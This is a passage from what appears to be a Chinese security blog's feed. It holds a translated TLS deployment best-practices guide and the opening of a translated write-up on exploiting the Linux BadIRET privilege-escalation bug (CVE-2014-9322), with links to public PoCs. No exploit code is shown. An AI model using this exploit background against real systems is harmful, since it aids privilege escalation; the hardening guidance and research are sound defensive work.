难以诊断，因为有些浏览器可以自己重构一个完整的信任链而其他浏览器则不行。&lt;/p&gt;

&lt;h3 id=&quot;section-8&quot;&gt;2.2 使用安全的协议&lt;/h3&gt;

&lt;p&gt;在SSL/TLS家族中有5种协议：SSLv2, SSL v3, TLS v1.0, TLS v1.1, TLS v1.2。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: TLS v1.3还在draft阶段&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;SSL v2不安全，坚决不能用。&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: OpenSSL和GnuTLS当前的版本(2014.12.2)不支持SSL v2&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;SSL v3用于HTTP已经被确认为不安全，用于其他协议时安全强度也不足。
它已经过时，不应该再被使用。&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Tom Li注: POODLE漏洞的出现彻底的废掉了SSLv3，受其影响，
  大量程序和库彻底取消了对SSLv3的支持。其实之前很多地方支持SSLv3
  的原因是兼容性问题。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;TLS v1.0在很大程度上是安全的。当用于非HTTP协议时，我们还不知道存在任何
已知的重大安全漏洞。当用于HTTP协议时，我们能够通过精心的服务器配置，来保证
它几乎是安全的。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;TLS v1.1和TLS v1.2没有已知的安全漏洞曝光。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: 由于Edward Snowden曝光的内容有关于NSA“今天记录，明天解密”的故事，
  所以大量的自由软件社区和暗网使者们在过去1年中(2013.7–2014)转向了TLS v1.2的PFS，2015年4月，[PCI-DSS v3.1] (https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-1.pdf)规定所有SSL的版本以及早期TLS版本将于2016年6月30日后不再支持)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;Lenx注：某一些TLS 1.x实现由于没有正确实现对PADDING的校验，同样存在POODLE脆弱性问题。
  这些有问题的TLS实现包括F5，A10，Checkpoint, Cisco等厂家的设备。
  同样，Lucky 13攻击一样对老版本的OpenSSL, GnuTLS，F5等大量库/设备实现有效。
  请确认打上补丁。[T2][T3]&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;TLS v1.2应该成为你的主要协议。这个版本有巨大的优势是因为它有之前版本
没有的特性。如果你的服务器平台（或中间设备）不支持TLS v1.2，做个升
级计划吧。如果你的服务提供商不支持TLS v1.2，要求他们升级。&lt;/p&gt;

&lt;p&gt;对于那些老的客户端，你还是需要继续支持TLS v1.0和TLS v1.1。使用临时的解
决方案（接下来会介绍），这些协议对于大多WEB站点依然被认为是足够安全的。&lt;/p&gt;

&lt;h3 id=&quot;cipher-suite&quot;&gt;2.3 使用安全的加密套件(Cipher Suite)&lt;/h3&gt;

&lt;p&gt;要安全的通信，首先得保证你是和你想通信的另一方直接通信（而不是
冒充者或者存在能够监听的中间人），并且安全的交换数据。
在SSL/TLS里，加密套件是定义你如何安全通信的。
它们由一堆多样化的组件组成，以确保安全。如果其中一个组件被发现是不安全的，
你应该切换到其他的组件上。&lt;/p&gt;

&lt;p&gt;你的目标应该是仅使用128位或者更强的加密、认证套件，其他都应该被排除掉：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Anonymous Diffie-Hellman (ADH) 套件不提供认证功能&lt;/li&gt;
  &lt;li&gt;NULL cipher suites不提供加密&lt;/li&gt;
  &lt;li&gt;出口密钥交换套件 (Export key exchange suites) 使用容易被破解的认证&lt;/li&gt;
  &lt;li&gt;使用强度不够的加密算法(比如40或者56位的加密强度)也容易被破解&lt;/li&gt;
  &lt;li&gt;RC4比之前想象的要弱，你应该在检查好兼容问题后，尽快去除掉&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Tom Li 注：2015年三月曝光的手段将RC4攻击实用化，RC4坚决不要再用 [T4]&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;3DES仅提供大约112位的安全系数，这也低于推荐的最低128位，不过依然足够强。
但实践中更大的问题是，她比其他替代算法要慢很多。所以，出于性能我们不推荐她，
但她依然可以放在加密套件的最后面，用来兼容非常陈旧的客户端&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Tom Li 注：RC4安全漏洞曝光后，这是老旧客户端唯一能用的算法了&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-9&quot;&gt;2.4 控制加密套件选型&lt;/h3&gt;

&lt;p&gt;在SSL v3和后来的版本里，客户端提交一个她支持的加密套件的列表，服务
器从列表中选择一个去跟客户端做协商，以构建一个安全的通信信道。
然而不是所有的服务器都能很好处理这个过程，一些服务器仅仅会简单的从列表中选择第一个。
让服务器选择正确的加密套件对于安全而言是极端重要的（详见 Section 2.7）。&lt;/p&gt;

&lt;h3 id=&quot;forward-secrecy&quot;&gt;2.5 支持正向安全（Forward Secrecy）&lt;/h3&gt;

&lt;p&gt;正向安全是一个协议特性，它使得安全会话不依赖于服务器的私钥。
当使用不支持正向安全的加密套件时，如果攻击者记录了通信内容，那么她可
以在未来获得私钥后，再解密先前的一切通信。你需要优先支持ECDHE套装，
来让浏览器选择支持正向安全。
为了支持更广泛的客户端，可将DHE套件作为ECDHE的协商回退（fallback)方案。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: NSA就在干这件事情，所以看出PFS有多重要了吧&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-10&quot;&gt;2.6 关闭客户端发起的重协商&lt;/h3&gt;

&lt;p&gt;在SSL/TLS里，重协商允许一方停止交换数据而去重新协商一个安全会话。有一些
场景需要服务器发起重协商的请求，但客户端并没有发起重协商请求的必要。此
外，曾经出现过客户端发起重协商请求的拒绝服务攻击。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注解: 每个重协商请求服务器的计算量是客户端的15倍&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-11&quot;&gt;2.7 降低已知漏洞风险&lt;/h3&gt;

&lt;p&gt;没有什么是绝对安全的，很多防护方案都会随着时间推移成为安全问题。最佳实
践是随时关注信息安全的世界在发生些什么，然后采取必要的措施。最简单的是你
应该尽快的打每一个补丁。&lt;/p&gt;

&lt;p&gt;下面的一些问题应该引起你的注意：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;关闭不安全的重协商&lt;/p&gt;

    &lt;p&gt;重协商特性在2009年时被发现是不安全的，协议需要更新。今天大部分厂商已
经修复，至少提供了一个临时方案。不安全的重协商很危险，因为她很容易被
利用，用来进行跨站请求伪造（CSFR）攻击，并在某些情况下引发跨站脚本（XSS）
攻击。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;关闭TLS压缩&lt;/p&gt;

    &lt;p&gt;2012年，CRIME攻击[6]向我们展示了TLS压缩所导致的信息泄漏可以被攻击者用
于还原部分的敏感数据(比如session cookies)。只有几款客户端支持TLS
压缩（而现在就更少了），所以即使关掉TLS压缩，也完全不会遇到服务器性能
问题。针对TLS压缩的攻击风险有限。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;降低HTTP压缩的信息泄漏风险&lt;/p&gt;

    &lt;p&gt;2个CRIME的变种攻击在2013年被曝光，不像CRIME针对TLS压缩，TIME和BREACH
漏洞是针对压缩过的HTTP响应。HTTP压缩对于很多公司都很重要，这个
问题不容易解决。风险减缓方案可能需要修改业务代码。&lt;/p&gt;

    &lt;p&gt;对于TIME和BREACH攻击，只要攻击者有足够攻击你的理由，那影响等同于CSRF。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;关闭RC4&lt;/p&gt;

    &lt;p&gt;RC4 cihpersuites已经被认为是不安全而且应该关闭。目前，对于攻击者最好
的情况需要百万次的请求，和大量的带宽。因此危害是比较低的，不过我们期待
未来有改进的攻击手法。在去除RC4之前，检查这是否会影响现有的用户；换句话
说，你应该查查有没有仅支持RC4的客户端。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;注意BEAST攻击&lt;/p&gt;

    &lt;p&gt;2011年曝光的BEAST攻击是2004年的一个针对TLS 1.0或者更早版本但当时被认
为很难被利用的一个漏洞。一次成功的BEAST攻击的影响约等于会话劫持。在一段时间内，
尽管问题出在客户端，在服务端避免BEAST攻击是合适的。但不幸的是，
服务器需要使用RC4来避免问题，而这已经不再推荐了。因为这个原因，再加上
目前BEAST攻击已经在大量客户端中被解决了，我们不再推荐在服务端避免攻击。
在有大量旧客户端受BEAST攻击影响的情况下，使用RC4和TLS 1.0也许更安全。
如何取舍需要在完全了解环境，建立威胁模型后小心决定。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;关闭SSLv3&lt;/p&gt;

    &lt;p&gt;SSLv3受到2014年10月曝光的POODLE攻击威胁。此攻击很容易被利用来攻击HTTP客户端运行
JavaScript恶意程序。客户端也很容易被攻击者忽悠，从一个更安全的协议（如 TLSv1.2）
降级到不安全的SSLv3。因此最好的解决方案是在服务器完全禁用SSLv3，绝大多数站点都
可以安全的实施。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Lenx注: 由于国内仍然存在大量IE 6客户端，不支持TLS 1.x。目前如果必须
  要支持SSLv3，那么只能选择RC4，并注意开启TLS_FALLBACK_SCSV防止降级攻击。
  此外注意库的及时升级，相关漏洞是一茬接着一茬的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;section-12&quot;&gt;3. 性能&lt;/h2&gt;

&lt;p&gt;这份文档中安全是主要关注点，但我们也必须注意到性能的问题。一个安全服
务不能满足性能需求无疑会被遗弃掉。然而，因为TLS配置通常不会带来很大的性
能开销，我们把讨论限定在会导致严重性能下降的常见配置问题上。&lt;/p&gt;

&lt;h3 id=&quot;section-13&quot;&gt;3.1 不要使用强度过高的私钥&lt;/h3&gt;

&lt;p&gt;在建立一条安全连接的密钥协商的过程当中最大的开销是由私钥大小决定的，使
用密钥过短会不安全，使用密钥过长会的导致在一些场景无法忍受的性能下降。
对于大多的WEB站点，使用超过2048位的RSA/DHE密钥，或者超过256位的ECDSA/ECDHE密钥是浪
费CPU和影响用户体验的。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注：256-bit的&lt;a href=&quot;https://tools.ietf.org/html/rfc4492&quot;&gt;ECC密钥强度&lt;/a&gt;足够胜任很长一段时间&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;session&quot;&gt;3.2 确保正确使用Session重用&lt;/h3&gt;

&lt;p&gt;Session重用是一种性能优化技术，让耗时的密码计算操作的结果在一段时间里可重复使
用。当Session重用机制失效时可能会导致严重性能下降。&lt;/p&gt;

&lt;h3 id=&quot;http&quot;&gt;3.3 使用持久性链接(HTTP)&lt;/h3&gt;

&lt;p&gt;今天绝大多数SSL开销并非来自CPU密集型的密码计算操作，而是网络延迟。一个TLS握
手是建立在TCP握手结束后，她需要交换更多的数据包。为了让网络延迟最小化，
你应该启用HTTP持久化( keep-alives)，从而让你的用户能在一个TCP链接上发多次
HTTP请求。&lt;/p&gt;

&lt;h3 id=&quot;http-1&quot;&gt;3.4 为公共资源开启缓存(HTTP)&lt;/h3&gt;

&lt;p&gt;当使用TLS通信时，浏览器会假设所有的流量都是敏感信息。浏览器会把一些特定的
资源缓存到内存里，但是一旦你关闭了浏览器，这些内容就丢失了。为了提升性
能，为一些资源开启长期缓存，通过加入”Cache-Control: public”返回header给
浏览器标记为公共资源（比如图片）。&lt;/p&gt;

&lt;h3 id=&quot;ocsp-stapling&quot;&gt;3.5 使用 OCSP Stapling&lt;/h3&gt;

&lt;p&gt;OCSP Staling是改版的OSCP协议，使得传递证书吊销信息成为TLS握手的一部分，直接
从服务器传递到浏览器。因此，浏览器不再需要额外联系OCSP服务器来验证服务器，
从而大幅降低连接耗时。&lt;/p&gt;

&lt;h2 id=&quot;http-2&quot;&gt;4. 应用设计（HTTP）&lt;/h2&gt;

&lt;p&gt;HTTP协议和WEB相关平台在SSL诞生后仍然在不断的进化。进化的结果就是有一些
今天包含的特性已经对加密不利。在这个Section里，我们会罗列出这些特性，也
包括如何安全的使用它们。&lt;/p&gt;

&lt;h3 id=&quot;section-14&quot;&gt;4.1 100%的加密你的网站&lt;/h3&gt;

&lt;p&gt;事实上”加密是一个备选“的思想大概是今天最严重的安全问题之一。我们来看看
以下问题：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;网站应该用TLS但没用&lt;/li&gt;
  &lt;li&gt;网站有TLS但不是强制性的使用&lt;/li&gt;
  &lt;li&gt;网站混合了TLS和非TLS的内容，有时候甚至在相同的网页上&lt;/li&gt;
  &lt;li&gt;网站编程错误导致TLS被攻陷&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;虽然如果你知道你自己在做什么的话，这些问题大部分是可以避免的。然而一般而言，
唯一有效的方式是强制对所有的内容通信进行加密 —— 没有豁免。&lt;/p&gt;

&lt;h3 id=&quot;section-15&quot;&gt;4.2 避免混合内容&lt;/h3&gt;

&lt;p&gt;混合内容的页面是已经使用TLS，但有些资源（比如JavaScript文件，图片，
CSS）是通过非TLS的方式传输的。这些页面不安全，主动的中间人攻击者可以劫持这
些不受保护的JavaScript的资源，从而……例如劫持整个用户会话。就算你遵循了前面的
建议加密了自己网站上所有的内容，但也不排除来自第三方网站的资源是没有加密的。&lt;/p&gt;

&lt;h3 id=&quot;section-16&quot;&gt;4.3 理解信任第三方&lt;/h3&gt;

&lt;p&gt;网站通常会通过来自其他服务器的JavaScript代码来使用第三方的服务，Google Analytics是一个
应用广泛的例子。内含的第三方代码创建了一个隐式的信任链，让第三方可以完
全控制你的网站。第三方本身可能并没有恶意，但他们很容易成为攻击者的目标。
原因很简单，如果一个大型第三方提供商被攻陷，那攻击者就可以利用这一路径
导致所有使用它的人全都自动被攻陷。&lt;/p&gt;

&lt;p&gt;如果你采纳了Section 4.2的建议，至少你的第三方链接在加密后可以防止中间人
攻击。此外，你应该进一步去了解你的站点使用了哪些服务，去除、替换或者承担其中的
风险并继续使用。&lt;/p&gt;

&lt;h3 id=&quot;cookies&quot;&gt;4.4 安全Cookies&lt;/h3&gt;

&lt;p&gt;为了安全，网站需要TLS。然而网站使用的cookies也要标记为安全。如果不能保护cookies，就
让中间人攻击者使用诡计获取信息成为可能，即使网站本身是100%加密的。&lt;/p&gt;

&lt;h3 id=&quot;hsts&quot;&gt;4.5 部署HSTS&lt;/h3&gt;

&lt;p&gt;HTTP严格传输安全（HSTS）是TLS协议的保护伞：它被设计成即使存在配置和实现错误的情况下，依然能保证安全。
设置一个简单的响应header就能在支持HSTS的浏览器（目前是 Chrome、FireFox、Safari 和
Opear，IE 很快就会支持）上激活保护。&lt;/p&gt;

&lt;p&gt;HSTS的目的是很简单的：在激活之后，它就会禁止与网站进行任何不安全通信，自动把明文链接转换
成安全链接。一个额外的特性让用户不能无视证书警告（证书警告是
中间人攻击的标志，而研究表明大多数用户都会无视警告，最好永远不要让用户这么做）&lt;/p&gt;

&lt;p&gt;支持HSTS是一项能大幅度提高你网站TLS安全性的措施。新的网站应该在设计的时候就考虑到HSTS，而旧的
站点则应该尽快支持。&lt;/p&gt;

&lt;h3 id=&quot;section-17&quot;&gt;4.6 关闭敏感内容的缓存&lt;/h3&gt;

&lt;p&gt;敏感内容应该被确实看作是敏感，只能发送给该知道的一方。尽管代理服务器看不到加密流量，
也不能把它共享给别人，但是随着基于云的应用在增加，你必须得小心区分公开资源和敏感内容。&lt;/p&gt;

&lt;h3 id=&quot;section-18&quot;&gt;4.7 确保没有其他漏洞&lt;/h3&gt;

&lt;p&gt;TLS不代表就安全，TLS的设计只是涉及安全的一个方面–通信过程中的保密性和
完整性——但还有其他威胁你必须面对。&lt;/p&gt;

&lt;h2 id=&quot;validation&quot;&gt;5. Validation&lt;/h2&gt;

&lt;p&gt;在配置的时候可以进行调整的参数有一大堆，而你很难完全了解修改什么会有什么影响，
而有些时候改动可能是无意的；软件升级也会悄悄引入变化。因此，我们建议使用一款
SSL/TLS评估工具来检查你的配置是不是真的安全，并定期运行检查保证你一直都安全。
对于公开站点，我们推荐使用&lt;a href=&quot;https://www.ssllabs.com/ssltest/&quot;&gt;SSLLab网站上的免费在线工具&lt;/a&gt;
它的“握手模拟”功能在实践中非常有用，可以让不同的TLS客户端连接时时候的参数一清二楚。&lt;/p&gt;

&lt;h2 id=&quot;section-19&quot;&gt;6. 高级议题&lt;/h2&gt;

&lt;p&gt;下面的这些议题超出了这份文档的范畴，她们需要对SSL/TLS和公钥架构(PKI)有
更深的理解，这些议题依然是受到争议的。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Extended Validation证书&lt;/p&gt;

    &lt;p&gt;EV证书是很靠谱的证书，只有经过充分的线下审核后才给予颁发。证书的目的是明确
机构和它的对应线上网站的身份联系。EV证书更难伪造，提供了更好的安全性，
并且在浏览器上呈现给用户时的待遇也更高。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Public key pinning&lt;/p&gt;

    &lt;p&gt;Public key pinning的设计是为网站运维能限制哪些CA才可以为他们的网站签
发证书。这个特性是Google开发的，目前已经硬编码到了Chrome浏览器里面，
并且证明对避免攻击和引发大众关注非常有效。在2014年，FireFox也加入了对
硬编码pinning的支持。一个叫做《HTTP的Pubilc Key Pinning扩展》的标准已经
发展了很长时间了，很快讲会发布。我们期待这个特性今后至少被主流浏览器支持。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ECDSA私钥&lt;/p&gt;

    &lt;p&gt;事实上所有的网站都依赖于RSA私钥。这个算法是WEB通信安全的基础。因为一
些原因，我们正在从1024位转向2048位的RSA密钥。而增加密钥长度可能会带来
性能问题。椭圆曲线密码学(ECC)使用了不同的数学，能在较小的密钥长度下有
较强的安全性。RSA密钥可以被ECDSA替代，目前只有少数的CA支持ECDSA，但我
们期待未来会有更多。在迁移到ECDSA的时候，一个主要的问题是并非所有的
客户端都支持它，如果你考虑使用ECDSA，应该确认它是否会影响用户连接服务器。
有些平台支持双密钥部署，可以让你同时使用RSA和ECDSA以适配所有的客户端。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;改动&lt;/p&gt;

&lt;p&gt;这份文档的最初的版本是在2012年2月24日发布的。这个Section跟踪了文档修改
的时间，从1.3开始。&lt;/p&gt;

&lt;p&gt;版本 1.3 (2013年9月17日)
此版本的改动有：
• 推荐替换1024位证书
• 推荐不对SSLv3进行支持
• 删去推荐使用RC4来服务端避免BEAST攻击的内容
• 推荐禁用RC4
• 推荐在未来禁用3DES
• 警告关于CRIME攻击的变种（TIME和BREACH攻击）
• 推荐支持正向安全
• 加入对ECDSA证书的讨论&lt;/p&gt;

&lt;p&gt;版本 1.4 (2014年12月8日）
此版本的改动有：
• 讨论SHA1过时的问题，推荐迁移到SHA2系列算法
• 推荐禁用SSLv3，提及POODLE攻击
• 扩张Sectios 3.1，涵盖DHE和ECDHE密钥交换强度
• 推荐OCSP Stap&lt;/p&gt;

&lt;p&gt;感谢&lt;/p&gt;

&lt;p&gt;为了有价值的反馈和起草这份文档，特别感谢Marsh Ray (PhoneFactor), Nasko
Oskov (Google), Adrian F. Dimcev和Ryan Hurst(GlobalSign)。也感谢其他慷
慨的分享关于信息安全和密码学的人。这份文档虽然是我写的，但这些内容则来
自整个安全社区。&lt;/p&gt;

&lt;p&gt;关于SSL Labs
……………..&lt;/p&gt;

&lt;p&gt;关于Qualys
…………….&lt;/p&gt;

&lt;p&gt;[1] SHA1 Deprecation Policy (Windows PKI blog, 12 November 2013)
http://blogs.technet.com/b/pki/archive/2013/11/12/sha1-deprecation-policy.aspx&lt;/p&gt;

&lt;p&gt;[2] Gradually Sunsetting SHA-1 (The Chromium Blog, 5 September 2014)
http://blog.chromium.org/2014/09/gradually-sunsetting-sha-1.html&lt;/p&gt;

&lt;p&gt;[3] On the Security of RC4 in TLS and WPA (Kenny Paterson et al.; 13 March 2013)
http://www.isg.rhul.ac.uk/tls/&lt;/p&gt;

&lt;p&gt;[4] Deploying Forward Secrecy (Qualys Security Labs; 25 June 2013)
https://community.qualys.com/blogs/securitylabs/2013/06/25/ssl-labs-deploying-forward-secrecy&lt;/p&gt;

&lt;p&gt;[5] Increasing DHE strength on Apache 2.4.x (Ivan Ristić’s blog; 15 August 2013)
http://blog.ivanristic.com/2013/08/increasing-dhe-strength-on-apache.html&lt;/p&gt;

&lt;p&gt;[6] TLS Renegotiation and Denial of Service Attacks (Qualys Security Labs Blog, October 2011)
https://community.qualys.com/blogs/securitylabs/2011/10/31/tls-renegotiation-and-denial-of-service-attacks&lt;/p&gt;

&lt;p&gt;[7] SSL and TLS Authentication Gap Vulnerability Discovered (Qualys Security Labs Blog; November 2009)
https://community.qualys.com/blogs/securitylabs/2009/11/05/ssl-and-tls-authentication-gap-vulnerability-discovered&lt;/p&gt;

&lt;p&gt;[8] CRIME: Information Leakage Attack against SSL/TLS (Qualys Security Labs Blog; September 2012)
https://community.qualys.com/blogs/securitylabs/2012/09/14/crime-information-leakage-attack-against-ssltls&lt;/p&gt;

&lt;p&gt;[9] Defending against the BREACH Attack (Qualys Security Labs; 7 August 2013)
https://community.qualys.com/blogs/securitylabs/2013/08/07/defending-against-the-breach-attack&lt;/p&gt;

&lt;p&gt;[10] Internet-Draft: Prohibiting RC4 Cipher Suites (A. Popov, 1 October 2014)
http://datatracker.ietf.org/doc/draft-ietf-tls-prohibiting-rc4/&lt;/p&gt;

&lt;p&gt;[11] Mitigating the BEAST attack on TLS (Qualys Security Labs Blog; October 2011)
https://community.qualys.com/blogs/securitylabs/2011/10/17/mitigating-the-beast-attack-on-tls&lt;/p&gt;

&lt;p&gt;[12] Is BEAST Still a Threat? (Qualys Security Labs; 10 September 2013)
https://community.qualys.com/blogs/securitylabs/2013/09/10/is-beast-still-a-threat&lt;/p&gt;

&lt;p&gt;[13] This POODLE bites: exploiting the SSL 3.0 fallback (Google Online Security Blog, 14 October 2014)
http://googleonlinesecurity.blogspot.co.uk/2014/10/this-poodle-bites-exploiting-ssl-30.html&lt;/p&gt;

&lt;p&gt;[14] About EV SSL Certificates (CA/B Forum web site)
https://www.cabforum.org/certificates.html&lt;/p&gt;

&lt;p&gt;[T1] HAS THE RSA ALGORITHM BEEN COMPROMISED AS A RESULT OF BERNSTEIN’S PAPER?
http://www.emc.com/emc-plus/rsa-labs/historical/has-the-rsa-algorithm-been-compromised.htm&lt;/p&gt;

&lt;p&gt;[T2] Poodle Bites TLS
https://community.qualys.com/blogs/securitylabs/2014/12/08/poodle-bites-tls&lt;/p&gt;

&lt;p&gt;[T3] Lucky Thirteen: Breaking the TLS and DTLS Record Protocols
http://www.isg.rhul.ac.uk/tls/Lucky13.html&lt;/p&gt;
</description>
        <pubDate>Wed, 29 Jul 2015 01:59:07 +0800</pubDate>
        <link>http://www.hardenedlinux.org/cryptography/2015/07/29/ssl-tls-deployment-1.4.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/cryptography/2015/07/29/ssl-tls-deployment-1.4.html</guid>
        
        
        <category>cryptography</category>
        
      </item>
    
      <item>
        <title>后续故事：数字军火级别的&quot;BadIRET&quot;漏洞利用(CVE-2014-9322)</title>
        <description>&lt;p&gt;作者：pi3, July 4 2015&lt;/p&gt;

&lt;p&gt;原文：&lt;a href=&quot;http://blog.pi3.com.pl/?p=509&quot;&gt;Follow-up on Exploiting “BadIRET” vulnerability (CVE-2014-9322)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;译者：Shawn the R0ck, July 5 2015&lt;/p&gt;

&lt;p&gt;Shawn：nergal在2015年2月公开的针对&lt;a href=&quot;http://hardenedlinux.org/jekyll/update/2015/07/05/badiret-analysis.html&quot;&gt;BadIRET漏洞的分析文章&lt;/a&gt;仿佛就在昨天，但Linux内核社区对安全的态度的确比10年还糟糕，Linux内核社区一如既往坚持”Security through obscurity”这种简单到根本不用考虑斯拉夫兵工厂的威胁建模，不辛的是，BadIRET又是一例Linux内核社区认为几乎不可利用但实际是可利用的漏洞，更糟糕的是一些商业GNU/Linux厂商因为各种原因（在后棱镜时代，不得不考虑非商业因素的可能）基本按照&lt;a href=&quot;https://securityblog.redhat.com/2015/04/08/dont-judge-the-risk-by-the-logo/&quot;&gt;是否有公开的漏洞利用会成为他们对于风险评估的重要指标&lt;/a&gt;，这种说法好像是当0-day exploit从来都不存在一样，这的确是一个黑暗的时代，就算没有Mr.Snowden，这的确也称的上是一个黑暗的信息时代，anyway，这次pi3公开了BadIRET的漏洞利用代码，这对于安全研究人员来说是一个好事，也希望整个事件能帮助个人以及企业GNU/Linux用户对于安全有正确的认识。&lt;/p&gt;

&lt;p&gt;一个漏洞的产生到漏洞利用至少会经历好几个阶段：Bug –&amp;gt; exploitable bug(vulnerability) –&amp;gt; poc –&amp;gt; exploit –&amp;gt; reliable/weaponized exploit。虽然skiddie都喜欢把fuzzing出来的bug讲成blah-blah-blah的故事或者作为PR，但让数字军火商或者斯拉夫兵工厂关心的漏洞属于能到最后两个阶段的vulnerability。&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;by pi3&lt;/p&gt;

&lt;p&gt;Hi,&lt;/p&gt;

&lt;p&gt;分析&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9322&quot;&gt;CVE-2014-9322&lt;/a&gt;的旅程并非一帆风顺，但它值得我们花一些时间去分析所有的信息。我会尽力…&lt;/p&gt;

&lt;h2 id=&quot;introduction--non-technical-almost&quot;&gt;1) Introduction – non-technical (almost)&lt;/h2&gt;

&lt;p&gt;一切都开始于&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9090&quot;&gt;CVE-2014-9090&lt;/a&gt;。这个漏洞是由Andy Lutomirski发现的，引用MITRE的描述：&lt;/p&gt;
&lt;pre&gt;
Linux内核3.17.4在arch/x86/kernel/traps.c里的do_double_fault函数没有正确
的处理SS(Stack Segment)寄存器相关的错误处理，导致本地用户可以发启DoS攻
击让内核panic(...)
&lt;/pre&gt;

&lt;p&gt;这个顶多导致本地DoS攻击的洞对于防御者而言听起来并不是那么重要（但也引起了一定的注意，因为毕竟是一个漏洞），对于攻击者的角度也是一样，因为即使利用成功也无法获得巨大利益( Shawn:相对于获得root而言)。&lt;/p&gt;

&lt;p&gt;“有趣”的是在Borislav Petkov问了一些问题后，Andy Lutomirski在相同的功能里发现了另一个被第一个漏洞掩盖的漏洞。不幸(幸运)的是，这是一个很严重的漏洞。Linux内核在x86架构下没有恰当的处理于SS寄存器有关的错误处理。引用自MITRE：&lt;/p&gt;
&lt;pre&gt;
&quot;(...)通过触发一个IRET指令从一个错误的空间去去访问一个GS基地址从而让本地用户获取最高权限&quot;
&lt;/pre&gt;

&lt;p&gt;这个漏洞的特性听起来很熟悉吗？&lt;/p&gt;

&lt;p&gt;那Rafal ‘n3rgal’ Wojtczuk的研究最终停止于&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0217&quot;&gt;CVE-2012-0217&lt;/a&gt;呢？(这个直接指向了&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0744&quot;&gt;CVE-2006-0744&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;是的…原则上两个漏洞都给我们了相同的东西 — 我们能强制内核去执行在用户空间控制的GS基地址（通过%gs寄存器）。&lt;/p&gt;

&lt;p&gt;因为一些原因CVE-2014-9322并没有引起太多注意（跟CVE-2006-0744类似），直到Rafal ‘n3rgal’ Wojtczuk在2015年2月5日在Bromium Labs的blog上&lt;a href=&quot;http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/&quot;&gt;公布了另外震撼的研究&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;这篇分析谈到了关于这个漏洞的本质，即可以被利用为代码执行（这可不是简单的事情，点赞n3rgal的研究）和使用单个字节为NULL的写操作让整个漏洞利用成为军火级别的稳定利用，能绕过SMEP（不是SMAP）。非常推荐读读这篇分析。&lt;/p&gt;

&lt;p&gt;在这篇漏洞分析公开后引起了更多的关注（特别是grsecurity的twitter帐号:-)）。知道现在（差不多半年了）也没有公开的真正的漏洞利用去实现Rafal关于代码执行的想法。只有一个演示DoS攻击的PoC（结果和CVE-2014-9090相同 — 没多大用处）：&lt;/p&gt;

&lt;p&gt;https://rdot.org/forum/showthread.php?t=3341&lt;/p&gt;

&lt;p&gt;另外一个实现：&lt;/p&gt;

&lt;p&gt;https://www.exploit-db.com/exploits/36266/&lt;/p&gt;

&lt;h2 id=&quot;more-technical-part-based-on-fedora-20---kernel-31110-301fc20x8664&quot;&gt;2) More technical part (based on Fedora 20 -&amp;gt; kernel: 3.11.10-301.fc20.x86_64)&lt;/h2&gt;

